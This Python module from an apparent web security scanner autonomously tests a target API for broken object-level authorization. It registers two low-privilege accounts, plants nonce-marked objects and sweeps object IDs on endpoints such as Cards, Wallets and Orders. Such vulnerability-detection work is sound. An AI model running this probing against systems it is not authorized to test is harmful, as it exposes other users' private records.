"""
core/wraith/bola_probe.py

Autonomous two-principal BOLA probing — drive core.wraith.bola against a live
target from a cold start.

The engine confirms a cross-boundary read; producing the two principals and the
victim-owned objects autonomously is the work here:

  1. Acquire TWO distinct low-priv sessions, A (victim) and B (attacker).
  2. Assemble objects A owns, each tagged with an A-PRIVATE marker B cannot have
     supplied itself:
       - OpenAPI/Swagger-discovered collections: A creates an object carrying a
         planted secret nonce (marker = the nonce; the object id/title B uses as a
         reference is deliberately excluded).
       - Session-scoped objects (e.g. A's basket): marker = A's own user id,
         captured from A's view, with a control read of B's own object to prove the
         marker is genuinely A-private.
  3. Attacker B requests each; the engine confirms when B's response carries A's
     marker. Throwaway created objects are cleaned up.

Everything is scope-gated + bounded by the caller. Best-effort; never raises.
"""

from __future__ import annotations

import logging
import os
import re
from typing import Any, Awaitable, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from core.wraith.bola import BolaFinding, OwnedObject, _contains, _stringify, test_bola
from core.wraith.bola_scale import sweep_object_ids
from core.wraith.logic_probe import _obj_id, acquire_low_priv_session

logger = logging.getLogger(__name__)

Send = Callable[[str, str, Optional[Dict[str, Any]]], Awaitable[Tuple[int, Any]]]

_PARAM_RE = re.compile(r"\{([^}]+)\}")
# Common user-owned, numeric-id collections to sweep for systemic horizontal BOLA.
# The distinct-owner gate keeps a generous list false-positive-free.
_BUILTIN_BYID = [
    "/rest/basket/{id}", "/api/Baskets/{id}", "/api/Feedbacks/{id}",
    "/api/Addresss/{id}", "/api/Cards/{id}", "/api/Orders/{id}",
    "/api/Wallets/{id}", "/api/Complaints/{id}", "/api/Quantitys/{id}",
]
_OPENAPI_PATHS = ("/openapi.json", "/swagger.json", "/v3/api-docs",
                  "/api/openapi.json", "/api-docs", "/openapi.yaml")
# Session-scoped object references to try (id substituted in). The id (which B
# also holds for its own object) is never the marker — A's identity is.
_BASKET_REFS = ("/rest/basket/{bid}", "/api/Baskets/{bid}")


def _nonce(tag: str) -> str:
    return f"sf{tag}_{os.urandom(5).hex()}"


def _deep_get(obj: Any, key: str) -> Any:
    kl = key.lower()
    if isinstance(obj, dict):
        for k, v in obj.items():
            if str(k).lower() == kl:
                return v
        for v in obj.values():
            r = _deep_get(v, key)
            if r is not None:
                return r
    elif isinstance(obj, list):
        for x in obj:
            r = _deep_get(x, key)
            if r is not None:
                return r
    return None


def _resolve_ref(schema: Any, spec: Dict[str, Any], _depth: int = 0) -> Dict[str, Any]:
    """Follow a JSON-pointer `$ref` into the document (FastAPI/OpenAPI put request
    bodies behind `#/components/schemas/<Model>` rather than inlining properties)."""
    while isinstance(schema, dict) and "$ref" in schema and _depth < 6:
        ref = schema["$ref"]
        if not isinstance(ref, str) or not ref.startswith("#/"):
            return {}
        node: Any = spec
        for part in ref[2:].split("/"):
            node = node.get(part) if isinstance(node, dict) else None
            if node is None:
                return {}
        schema, _depth = node, _depth + 1
    return schema if isinstance(schema, dict) else {}


async def _mine_openapi(origin: str, get: Send) -> List[Dict[str, Any]]:
    """Mine an OpenAPI/Swagger spec for POST collections that have a by-id GET
    sibling (so a created object can then be fetched by reference)."""
    for sp in _OPENAPI_PATHS:
        try:
            st, spec = await get("GET", origin + sp, None)
        except Exception:
            continue
        if not (200 <= int(st) < 300) or not isinstance(spec, dict):
            continue
        paths = spec.get("paths")
        if not isinstance(paths, dict):
            continue
        out: List[Dict[str, Any]] = []
        for p, item in paths.items():
            if not isinstance(item, dict) or "post" not in item:
                continue
            base = p.rstrip("/")
            byid = next((q for q, qi in paths.items()
                         if isinstance(qi, dict) and "get" in qi
                         and q.startswith(base + "/{") and q.endswith("}")), None)
            if not byid:
                continue
            schema = ((((item.get("post") or {}).get("requestBody") or {}).get("content") or {})
                      .get("application/json", {}).get("schema")) or {}
            schema = _resolve_ref(schema, spec)
            props = schema.get("properties") or {}
            out.append({"collection": p, "byid": byid, "props": props})
        if out:
            return out
    return []


def _build_owned_body(props: Dict[str, Any], byid: str) -> Tuple[Dict[str, Any], List[str]]:
    """Create body with planted nonces. Markers = values of fields NOT used as the
    object reference — those are exactly the values the attacker can't have known."""
    ref_params = set(_PARAM_RE.findall(byid))
    body: Dict[str, Any] = {}
    markers: List[str] = []
    for name, sch in (props.items() if isinstance(props, dict) else []):
        t = sch.get("type", "string") if isinstance(sch, dict) else "string"
        if t == "string":
            val = _nonce(name[:3])
            body[name] = val
            if name not in ref_params:
                markers.append(val)
        elif t in ("integer", "number"):
            body[name] = 1
        elif t == "boolean":
            body[name] = False
        elif isinstance(sch, dict) and "example" in sch:
            body[name] = sch["example"]
    return body, markers


def _fill_byid(origin: str, byid: str, body: Dict[str, Any], created: Any) -> Optional[str]:
    cid = _obj_id(created)
    out = byid
    for param in _PARAM_RE.findall(byid):
        if param in body:
            v = body[param]
        elif cid is not None:
            v = cid
        else:
            return None
        out = out.replace("{" + param + "}", str(v))
    return origin + out


async def probe_bola(
    target: str,
    *,
    register_post: Send,
    authed_send: Callable[[str], Send],
    max_objects: int = 24,
) -> List[Dict[str, Any]]:
    """Autonomously confirm BOLA with two low-priv principals.

    `register_post` is an UNAUTHENTICATED send (for acquiring sessions);
    `authed_send(token)` returns a send authenticated as that principal. Returns
    finding dicts. Best-effort; never raises.
    """
    parsed = urlparse(target if "://" in target else "http://" + target)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    sessA = await acquire_low_priv_session(origin, register_post)
    sessB = await acquire_low_priv_session(origin, register_post)
    if not sessA or not sessB:
        return []
    (tokA, ctxA), (tokB, ctxB) = sessA, sessB
    if tokA == tokB:               # must be two genuinely distinct principals
        return []
    sendA, sendB = authed_send(tokA), authed_send(tokB)

    owned: List[OwnedObject] = []
    created_refs: List[str] = []

    # 1. OpenAPI-discovered collections — A creates a nonce-bearing object.
    try:
        specs = await _mine_openapi(origin, sendA)
    except Exception:
        specs = []
    for spec in specs:
        body, markers = _build_owned_body(spec["props"], spec["byid"])
        if not markers:
            continue
        try:
            st, created = await sendA("POST", origin + spec["collection"], body)
        except Exception:
            continue
        if not (200 <= int(st) < 300):
            continue
        ref = _fill_byid(origin, spec["byid"], body, created)
        if not ref:
            continue
        owned.append(OwnedObject(ref=ref, markers=markers,
                                 label=f"victim's {spec['collection']} object"))
        created_refs.append(ref)

    # 2. Session-scoped object (basket): marker = A's user id (never B-suppliable),
    #    with a control read of B's own basket to prove the marker is A-private.
    bidA, bidB = ctxA.get("BasketId"), ctxB.get("BasketId")
    if bidA is not None:
        for tmpl in _BASKET_REFS:
            refA = origin + tmpl.replace("{bid}", str(bidA))
            try:
                st, mine = await sendA("GET", refA, None)
            except Exception:
                continue
            if not (200 <= int(st) < 300):
                continue
            uid = _deep_get(mine, "UserId")
            if uid is None:
                continue
            marker = f'"UserId":{uid}'
            if bidB is not None:
                try:
                    _, bown = await sendB("GET", origin + tmpl.replace("{bid}", str(bidB)), None)
                    if _contains(_stringify(bown), marker):
                        continue   # marker not A-private → would be a false positive
                except Exception:
                    pass
            owned.append(OwnedObject(ref=refA, markers=[marker], label="victim's basket"))
            break

    findings = await test_bola(owned, sendB, max_objects=max_objects)

    # Clean up throwaway objects we created as A (some APIs expose no DELETE).
    for ref in created_refs:
        try:
            await sendA("DELETE", ref, None)
        except Exception:
            pass

    for f in findings:
        logger.info("[bola_probe] confirmed cross-principal access: %s", f.object_ref)
    return [f.to_finding() for f in findings]


async def _capture_identity(origin: str, send: Send, ctx: Dict[str, Any]) -> set:
    """Best-effort set of strings identifying the attacker (so its own objects are
    excluded from a sweep): its basket id + user id, and anything a whoami exposes."""
    own: set = set()
    bid = ctx.get("BasketId")
    if bid is not None:
        own.add(str(bid))
        for tmpl in ("/rest/basket/{bid}", "/api/Baskets/{bid}"):
            try:
                st, mine = await send("GET", origin + tmpl.replace("{bid}", str(bid)), None)
            except Exception:
                continue
            if 200 <= int(st) < 300:
                uid = _deep_get(mine, "UserId")
                if uid is not None:
                    own.add(str(uid))
                break
    for p in ("/me", "/rest/user/whoami", "/api/users/me", "/api/me"):
        try:
            st, who = await send("GET", origin + p, None)
        except Exception:
            continue
        if 200 <= int(st) < 300:
            for k in ("id", "userId", "user_id", "email", "username"):
                v = _deep_get(who, k)
                if v is not None:
                    own.add(str(v))
    return own


async def probe_bola_scale(
    target: str,
    *,
    register_post: Send,
    authed_send: Callable[[str], Send],
    js_collections: Optional[List[str]] = None,
    max_endpoints: int = 9,
    max_per_endpoint: int = 16,
) -> List[Dict[str, Any]]:
    """Autonomously detect SYSTEMIC horizontal BOLA: one low-priv principal walks
    object id spaces and reads a whole population's private objects. Returns finding
    dicts. Best-effort; never raises."""
    parsed = urlparse(target if "://" in target else "http://" + target)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    sess = await acquire_low_priv_session(origin, register_post)
    if not sess:
        return []
    tok, ctx = sess
    send = authed_send(tok)

    own_identity = await _capture_identity(origin, send, ctx)

    # Discover by-id templates: built-ins + OpenAPI by-id paths + JS collections.
    templates: List[str] = list(_BUILTIN_BYID)
    try:
        for spec in await _mine_openapi(origin, send):
            byid = spec["byid"]
            for param in _PARAM_RE.findall(byid):
                byid = byid.replace("{" + param + "}", "{id}")
            templates.append(byid)
    except Exception:
        pass
    for col in (js_collections or []):
        templates.append(col.rstrip("/") + "/{id}")

    seen: set = set()
    findings: List[Dict[str, Any]] = []
    ids = list(range(1, max_per_endpoint + 1))
    for tmpl in templates:
        if tmpl in seen or "{id}" not in tmpl:
            continue
        seen.add(tmpl)
        if len(seen) > max_endpoints:
            break
        try:
            f = await sweep_object_ids("GET", origin + tmpl, send,
                                       own_identity=own_identity, ids=ids,
                                       max_requests=max_per_endpoint)
        except Exception:
            continue
        if f:
            findings.append(f.to_finding())
    return findings
